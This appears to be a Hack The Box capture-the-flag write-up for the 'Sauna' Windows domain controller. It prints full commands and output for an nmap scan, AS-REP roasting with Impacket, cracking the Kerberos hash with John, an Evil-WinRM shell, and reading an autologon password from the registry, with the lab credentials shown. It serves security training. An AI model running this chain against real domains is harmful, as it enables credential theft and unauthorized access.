

[logo]: https://github.com/Zer0CodeX/Hack-The-Box/raw/master/Sauna/Sauna.jpg
![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/Sauna/Sauna.png "Forest")

---
## NMAP:
As always we will start with nmap to scan for open ports and services:

```console

# Nmap 7.80 scan initiated Sun Feb 16 17:36:16 2020 as: nmap -sV -sT -sC -p 1-10000 -O -oN sauna_nmap 10.10.10.175
Nmap scan report for 10.10.10.175 (10.10.10.175)
Host is up (0.24s latency).
Not shown: 9986 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-16 23:44:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=2/16%Time=5E496355%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m00s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-02-16T23:47:03
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 16 17:49:43 2020 -- 1 IP address (1 host up) scanned in 807.22 seconds


```
## GetBPUsers.py :
```markdown

root@Kali:~/HTB/Sauna# GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile /root/HTB/Sauna/users -dc-ip 10.10.10.175 -format hashcat
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:8698eee841693bd7a2e22b9dbd21436a$8d6dfe38adf883a30c032e6762c4e298c782aac8e869e2e61f545b674bcf9231d250ab95affb93cc1df3bc7f1d701cc951b090c6da30e7854b8f7c502b32c402727d7f3bdaa0672a7a7acadd561f8c9cc47206a4f2976ba04998209692c2cf54eb674f9e2fead49aebd0a586454ccc7f2c82878743703494e64efded876da7b5d44a028eaec12d7f727d7d649f51fc6e7c0f827617487befdc2489d3287b36cce577bae6f3794cf7693f970669b0858ed3b5ae6ac1c243ccc6ef77c00409355e4f274e2fc4997c86bd5a388765187a1d40bf55c4f88a28695baf8fefabd9542be04a6eec6a17ab02b9a06e875de428e17c06c37f34a9f4044e52b1afaa7ead5a
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

```
and we successfully got hash for user "fsmith"

```

## John The Ripper
lets crack the hash using John The Ripper and rockyou passwords list
```console
root@Kali:~/HTB/Sauna# john hashes --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:18 DONE (2020-02-19 20:06) 0.05310g/s 559692p/s 559692c/s 559692C/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
We got the password "Thestrokes23"

## Evil-WinRM
as we got in nmap results 5985 port is open which used for windows remote management 
```markdown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```
Lets use Evil-WinRM to connect to the machine using the credentials we have .

```markdown
root@Kali:~/tools/Windows/evil-winrm# ruby evil-winrm.rb -u fsmith -p Thestrokes23 -i 10.10.10.175

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> cd ..
*Evil-WinRM* PS C:\Users\FSmith> cd desktop
*Evil-WinRM* PS C:\Users\FSmith\desktop> dir


    Directory: C:\Users\FSmith\desktop


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----        1/23/2020  10:03 AM             34 user.txt  
```
```markdown

*Evil-WinRM* PS C:\Users\FSmith\Documents> Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"

DefaultDomainName DefaultUserName                 DefaultPassword           
----------------- ---------------                 ---------------           
EGOTISTICALBANK   EGOTISTICALBANK\svc_loanmanager Moneymakestheworldgoround!

```




## Resources:


[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)






[![alt text](https://www.hackthebox.eu/badge/image/131282)](https://www.hackthebox.eu/profile/131282 "Zer0Code")


